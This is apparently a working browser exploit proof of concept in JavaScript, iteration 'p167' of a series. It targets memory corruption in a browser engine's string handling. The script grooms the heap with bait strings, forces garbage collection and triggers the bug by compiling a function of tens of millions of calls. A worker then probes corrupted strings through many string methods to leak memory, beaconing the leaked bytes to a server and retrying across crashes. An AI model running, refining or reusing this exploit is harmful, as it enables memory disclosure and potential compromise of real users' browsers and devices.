// p167 — GeoHot mode
//
// Stop trying to survive. p156 ALREADY survived. The problem is the READ.
// charCodeAt goes through m_data8 (intact). We need paths that read
// the corrupted m_fiber DIFFERENTLY.
//
// .length = 81400 IS a leak. It reads through rope resolution, not m_data8.
// What other operations read through the rope path?
//
// Also: retry loop. If the sweep crashes, the browser restarts and
// reloads the page. localStorage tracks attempts and varies timing.
//
// Beacon prefix: V167-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V167-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  // ── RETRY TRACKING ──
  var attempt = 0;
  try {
    attempt = parseInt(localStorage.getItem('p167_attempt') || '0');
    localStorage.setItem('p167_attempt', '' + (attempt + 1));
  } catch(e) {}

  B('BOOT-ATT' + attempt);

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V167-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;

        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              found = true;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // ── CORRUPTION DETECTED. GO WILD. ──
        beacon('FOUND');

        // Collect ALL lengths first (these are leaked data!)
        var lens = '';
        for (var i = 0; i < targets.length; i++) {
          lens += targets[i].length + ',';
        }
        beacon('LENS-' + lens);

        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) continue;

          beacon('T' + i + '-len=' + len + '-0x' + len.toString(16));

          // ── METHOD: codePointAt (may take different internal path) ──
          try {
            var cp0 = targets[i].codePointAt(0);
            var cp1 = targets[i].codePointAt(1);
            var cp4 = targets[i].codePointAt(4);
            beacon('CP' + i + '-' + cp0 + ',' + cp1 + ',' + cp4);
          } catch(e) { beacon('CP' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: normalize (forces full string resolution) ──
          try {
            var norm = targets[i].substring(0, 16).normalize('NFC');
            var nb = '';
            for (var b = 0; b < norm.length; b++) nb += hx(norm.charCodeAt(b));
            beacon('NORM' + i + '-' + nb);
          } catch(e) { beacon('NORM' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: string slice/trim (different resolution paths) ──
          try {
            var trimmed = targets[i].trim();
            beacon('TRIM' + i + '-len=' + trimmed.length);
          } catch(e) { beacon('TRIM' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: split (forces iteration over characters) ──
          try {
            var spl = targets[i].substring(0, 8).split('');
            var sb = '';
            for (var b = 0; b < spl.length; b++) sb += hx(spl[b].charCodeAt(0));
            beacon('SPL' + i + '-' + sb);
          } catch(e) { beacon('SPL' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: regex match (reads bytes through regex engine) ──
          try {
            var m = targets[i].substring(0, 32).match(/[^\x41]/);
            if (m) {
              beacon('RX' + i + '-hit=' + m.index + '-v=' + hx(m[0].charCodeAt(0)));
            } else {
              beacon('RX' + i + '-allA');
            }
          } catch(e) { beacon('RX' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: localeCompare (deep string comparison) ──
          try {
            var ref = '';
            for (var b = 0; b < 16; b++) ref += 'A';
            var cmp = targets[i].substring(0, 16).localeCompare(ref);
            beacon('CMP' + i + '-' + cmp);
          } catch(e) { beacon('CMP' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: Array.from (iterates code points via Symbol.iterator) ──
          try {
            var arr = Array.from(targets[i].substring(0, 16));
            var af = '';
            for (var b = 0; b < arr.length; b++) af += hx(arr[b].charCodeAt(0));
            beacon('AF' + i + '-' + af);
          } catch(e) { beacon('AF' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: spread into array (another iteration path) ──
          try {
            var spread = [... targets[i].substring(0, 16)];
            var sp = '';
            for (var b = 0; b < spread.length; b++) sp += hx(spread[b].charCodeAt(0));
            beacon('SPREAD' + i + '-' + sp);
          } catch(e) { beacon('SPREAD' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: TextEncoder (goes through WTF::String → UTF8) ──
          try {
            var enc = new TextEncoder();
            var bytes = enc.encode(targets[i].substring(0, 32));
            var te = '';
            for (var b = 0; b < bytes.length; b++) te += hx(bytes[b]);
            beacon('TE' + i + '-' + te.substring(0, 200));
          } catch(e) { beacon('TE' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: btoa (base64 encode, reads raw bytes) ──
          try {
            var b64 = btoa(targets[i].substring(0, 32));
            beacon('B64-' + i + '-' + b64.substring(0, 80));
          } catch(e) { beacon('B64-' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: encodeURIComponent (reads bytes for %XX encoding) ──
          try {
            var uri = encodeURIComponent(targets[i].substring(0, 16));
            beacon('URI' + i + '-' + uri.substring(0, 200));
          } catch(e) { beacon('URI' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: use as Map key (hashing reads all bytes) ──
          try {
            var map = new Map();
            var key = targets[i].substring(0, 16);
            map.set(key, true);
            var hasIt = map.has(key);
            beacon('MAP' + i + '-has=' + hasIt + '-keylen=' + key.length);
          } catch(e) { beacon('MAP' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: repeat + length (creates rope, checks resolution) ──
          try {
            var rep = targets[i].substring(0, 4).repeat(2);
            var rb = '';
            for (var b = 0; b < rep.length; b++) rb += hx(rep.charCodeAt(b));
            beacon('REP' + i + '-' + rb);
          } catch(e) { beacon('REP' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── METHOD: startsWith / endsWith / includes ──
          try {
            var sw = targets[i].startsWith('A');
            var inc = targets[i].includes('\x00');
            beacon('SI' + i + '-startsA=' + sw + '-hasNull=' + inc);
          } catch(e) { beacon('SI' + i + '-ERR-' + (e.message||'').substring(0,30)); }

          // ── CRITICAL: read .length as raw hex breakdown ──
          // 81400 = 0x13E08. Which bytes make this up?
          // If we can get .length to read from different entry offsets
          // by varying which string we check, we map the entry layout
          try {
            var rawLen = targets[i].length;
            var b0 = rawLen & 0xFF;
            var b1 = (rawLen >> 8) & 0xFF;
            var b2 = (rawLen >> 16) & 0xFF;
            var b3 = (rawLen >> 24) & 0xFF;
            beacon('RAWLEN' + i + '-' + hx(b3) + hx(b2) + hx(b1) + hx(b0));
          } catch(e) {}

          // Only do first 3 corrupted strings (beacon budget)
          if (i >= 2) break;
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAITS (vary count by attempt for different heap layouts) ──
  var N_BAIT = 20 + (attempt % 5) * 2; // 20, 22, 24, 26, 28 across retries
  var STR_LEN = 100000;
  B('BAIT-START-N' + N_BAIT);
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL ──
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v167fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v167ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v167ok ? 'OK' : 'FAIL'));
      if (!window.__v167fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v167fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
